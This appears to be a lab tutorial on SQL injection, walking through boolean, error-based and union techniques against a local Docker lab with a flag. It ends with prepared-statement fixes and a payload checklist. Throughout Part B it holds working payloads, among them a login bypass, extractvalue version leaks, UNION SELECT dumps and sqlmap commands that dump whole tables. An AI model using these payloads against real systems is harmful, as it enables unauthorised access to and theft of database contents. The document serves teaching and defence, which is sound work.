# SQL Injection Basics — Boolean, Union & Error Based

> **Difficulty:** Medium — **Level:** intermediate

## Introduction

**SQL Injection (SQLi)** is the **most severe** vulnerability in web history — a longtime leader of the OWASP Top 10 (A03 Injection). When an app concatenates user input directly into a SQL statement, an attacker can **break out of the string** and **rewrite the query** to read/dump the entire database, even write files. This lesson covers 3 foundational techniques: **boolean**, **error-based**, and **union** — manual first, `sqlmap` after.

---

## Part A — Understand

### How does SQLi happen?

Say the login code looks like this:

```php
$q = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

Enter `user = admin` normally → the SQL becomes:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '...'
```

But if you enter `user = ' OR 1=1-- -`:

```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...'
```

- `'` closes the `username` string early
- `OR 1=1` → condition always true
- `-- -` comments out the rest (password)

→ The query returns **every user** → login succeeds without a password!

> **Analogy:** The SQL statement is a "fill in the blank" sentence. Your input is what gets filled in. If the app doesn't validate, you can fill in **a whole code block** instead of just letters — changing the sentence's meaning.

### 3 SQLi types you'll learn

| Type | Relies on | When |
|------|-----------|------|
| **Boolean based** | True/False difference in response | Every case, confirm the vuln |
| **Error based** | DB error message leaks | When the app shows errors |
| **Union based** | Merge columns to read data directly | When output columns are rendered |

### Important characters

| Character | Purpose |
|-----------|---------|
| `'` | Close/open string |
| `"` | Close/open string (MySQL) |
| `-- -` | Comment (drop the rest) |
| `#` | Comment (MySQL) |
| `/* */` | Block comment |
| `;` | End statement (stacked queries) |
| `OR 1=1` | Always true |
| `AND 1=1` | Always true (stable condition) |

---

## Part B — Exploit: SQLi lab

### Step 1: Start the lab

```bash
cd sqli-basics/lab
docker compose up -d
# Lab at: http://localhost:7104
```

The lab is a login page + a product search page, both concatenating strings straight into SQL (MySQL).



### Step 2: Confirm the vulnerability (boolean-based)

Search products normally:

```bash
$ curl -s "http://localhost:7104/search.php?q=phone"
```

Now add payloads — if `q=phone' AND 1=1-- -` still shows results, but `q=phone' AND 1=2-- -` shows none → **definitely SQLi**:

```bash
# Expected: shows phone products (AND 1=1 true)
$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=1-- -"

# Expected: shows nothing (AND 1=2 false)
$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=2-- -"
```



> **Explanation:** `AND 1=1` is always true so results stay; `AND 1=2` is always false so the query returns no rows. This difference = the vulnerability's "signature".

### Step 3: Error-based — grab database info

When the app shows DB errors, force it to leak the version:

```bash
# Force MySQL to error with the version included
$ curl -s "http://localhost:7104/search.php?q=phone' AND extractvalue(1,concat(0x7e,version()))-- -"
ERROR: XPATH syntax error: '~8.0.35'
```



> **Explanation:** `extractvalue()` is a MySQL function that reads XML; pass it an invalid string `concat(0x7e,version())` → it **errors out with the content** `~8.0.35`. Like "forcing it to accidentally confess" — info leaks right inside the error message.

### Step 4: Determine column count (for Union)

Union needs the **exact column count**. Try `ORDER BY` step by step:

```bash
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 1-- -"   # ok
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 2-- -"   # ok
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 3-- -"   # ok
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 4-- -"   # ERROR → 3 columns
```



### Step 5: Union-based — dump data

```sql
SELECT id, name, price FROM products WHERE name = 'phone' UNION SELECT 1, 2, 3-- -'
```

```bash
$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT 1,2,3-- -"
```

Column 2 renders `2` → replace it with data you want. Grab database name + version:

```bash
$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT database(),version(),3-- -"
```



> **Explanation:** UNION merges two SELECTs with the **same column count**. The second result is YOURS — so you can read any table whose name you know.

### Step 6: Login bypass + flag

Back at login, sign in with no password:

```bash
$ curl -s "http://localhost:7104/login.php" -X POST -d "user=admin' OR 1=1-- -&pass=x"
Welcome admin! FLAG=FLAG{sql1_m4st3r_2026}
```



### Step 7: Automate with sqlmap (once you understand manual)

```bash
# Scan & dump the whole database automatically
sqlmap -u "http://localhost:7104/search.php?q=phone" --batch --dbs
sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db --tables
sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db -T users --dump
```



> ⚠️ **Golden rule:** Learn **manual first, sqlmap after**. sqlmap is a "self-driving car" — if you can't drive manually you can't read its output, and you won't know when it's wrong.

---

## Part C — Defend & Checklist

### How to fix (most important)

1. **Prepared statement / parameterized query:**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$user, $pass]);
```

2. **Never concatenate SQL** with user input, even after "filtering".
3. **Least privilege DB:** the app uses a DB user with SELECT on one schema only, not `root`.
4. **Hide error messages** — return a generic error, log details to the server log.

### Quick testing checklist

```text
[ ] '  (single quote → error/difference?)
[ ] ' OR 1=1-- -  (always true)
[ ] ' AND 1=1-- -  vs ' AND 1=2-- -
[ ] ORDER BY 1,2,3...  (find column count)
[ ] UNION SELECT 1,2,3...  (if numbers render → union ok)
[ ] SELECT version(), database(), user()
[ ] sqlmap --batch --dbs (automated confirmation)
```

---
